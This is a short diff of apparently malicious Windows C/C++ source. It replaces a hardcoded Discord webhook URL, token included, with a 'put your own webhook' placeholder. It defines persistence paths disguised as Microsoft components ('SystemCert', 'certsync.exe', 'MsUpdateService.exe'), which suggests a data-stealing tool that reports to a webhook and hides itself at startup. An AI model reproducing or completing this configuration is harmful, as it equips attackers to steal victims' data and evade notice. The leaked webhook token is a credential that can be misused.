@@ -22,8 +22,8 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "advapi32.lib")
-
-#define WEBHOOK_URL L"https://discord.com/api/webhooks/1383755825436295198/goEQtnqL_f3V-46oT9jdXq6CeFIkSkLA3a9UX-3VtiJ6bz2490qBgPm98m2xKm1jv47l"
+//put youre own webhook in
+#define WEBHOOK_URL L"PUT YOURE WEBHOOK IN HERE"
 #define MASTER_FOLDER L"\\Microsoft\\SystemCert"
 #define MASTER_EXE L"\\certsync.exe"
 #define STARTUP_EXE L"\\MsUpdateService.exe"
